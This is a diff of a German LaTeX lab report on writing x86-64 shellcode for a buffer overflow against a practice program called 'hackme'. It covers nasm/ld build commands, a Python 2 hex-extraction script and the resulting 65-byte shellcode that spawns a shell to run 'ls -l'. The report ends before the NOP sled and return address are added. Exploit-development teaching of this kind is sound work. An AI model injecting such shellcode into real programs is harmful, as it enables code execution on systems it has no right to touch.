@@ -652,13 +652,13 @@ Dieser ersetzt den derzeitigen Prozess mit einer neuen Shell und führt in diese
 % ----------------------------------------------------------------------------
 \subsection{Implementierung}
 % ----------------------------------------------------------------------------
-Um den Shellcode zu implementieren, wird dieser Zeile für Zeile in eine Datei mit der Endung \textbf{.asm} übertragen, in diesem Fall \texttt{exec.asm}.
+Um den Shellcode zu implementieren, wird dieser in eine Datei mit der Endung \textbf{.asm} übertragen, in diesem Fall \texttt{exec.asm}.
 \newline
 \newline
 Mit \texttt{nasm -f elf64 exec.asm} kann danach eine 64-Bit Object Datei erzeugt werden.
 \newline
 \newline
-Mit \texttt{ld -N exec.o -o exec} kann diese dann zu einer ausführbaren Datei gelinkt werden, um sie danach auszuführen. Wichtig ist, dass die \textbf{-N} Option mit angegeben wird, da die Text Section standardmäßig nicht schreibbar ist, wodurch jeder Versuch zu einem Segmentation fault führt.
+Mit \texttt{ld -N exec.o -o exec} kann diese dann zu einer ausführbaren Datei gelinkt werden, um sie danach auszuführen. Wichtig ist, dass die \textbf{-N} Option mit angegeben wird, da die Text Section standardmäßig nicht schreibbar ist, wodurch jeder solche Versuch zu einem Segmentation fault führt.
 
 \begin{lstlisting}[caption={Ohne -N Option}, captionpos=t]
 >> nasm -f elf64 exec.asm
@@ -681,7 +681,48 @@ total 12
 % ----------------------------------------------------------------------------
 \subsection{Entwicklung eins Python-Skript}
 % ----------------------------------------------------------------------------
+Um ein Skript zu entwickeln, dass den Shellcode über das Programm \textbf{hackme} ausführt, muss als erstes der Code aus der Object (.o) Datei extrahiert werden. Dazu kann das Programm \textbf{objcopy} verwendet werden.
 
+\begin{lstlisting}
+objcopy -O binary exec.o exec.bin
+\end{lstlisting}
+
+Die \textbf{-O binary} Option generiert einen Speicher Dump des Inhalts der Quelldatei ohne dabei die Metainformationen zu übernehmen.
+Nun muss der extrahierte Binärcode noch in Hexadezimal umformatiert werden, um ihn bequem in einem Skript nutzen zu können. Dies kann mit einem eigenen Python Skript realisiert werden, das als Ausgangspunkt für das eigentliche Skript dient.
+
+\begin{lstlisting}
+#!/bin/python2
+
+import sys
+
+shellcode           = ""
+shellcode_length    = 0
+
+binary = open(sys.argv[1], 'rb')
+
+for byte in binary.read():
+    shellcode = shellcode + ("\\x" + byte.encode("hex"))
+    shellcode_length += 1
+
+print(shellcode)
+print("\nLength: " + str(shellcode_length))
+\end{lstlisting}
+
+Das Skript liest eine übergebene Binärdatei ein und wandelt der Reihe nach jedes Byte in seine Hexadizimalrepräsentation um. Gleichzeitig wird die Anzahl der Bytes, d.h. die Länge des Shellcodes ermittelt.
+Wichtig ist, dass Python2 verwendet wird da unter Python3 für Bytes die \textbf{encode()} methode nicht mehr zur Verfügung steht. Mit diesem Skript lässt sich nun der extrahierte Binärcode in Hexadezimal umwandeln und auf der Kommandozeile ausgeben.
+
+\begin{lstlisting}
+>> ./exec_shellcode.py exec.bin 
+\x48\x31\xc9\x51\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73
+\x68\x48\xc1\xe9\x08\x51\x54\x5f\x48\x31\xc9\x51\x66
+\x68\x2d\x63\x54\x5b\x48\x31\xc9\x51\xeb\x11\x5a\x52
+\x80\x72\x05\x41\x53\x57\x54\x5e\x48\x31\xd2\xb0\x3b
+\x0f\x05\xe8\xea\xff\xff\xff\x6c\x73\x20\x2d\x6c\x41
+
+Length: 65
+\end{lstlisting}
+
+Als nächstes gilt es den Shellcode noch mit einem NOP Sled sowie einer Rücksprungadresse zu versehen um die letztendliche Payload zu erhalten. Dafür muss aber zuerst noch das \textbf{hackme} Programm analysiert werden, um die Größe des Sleds richtig wählen zu können.
 \end{document}
 
 
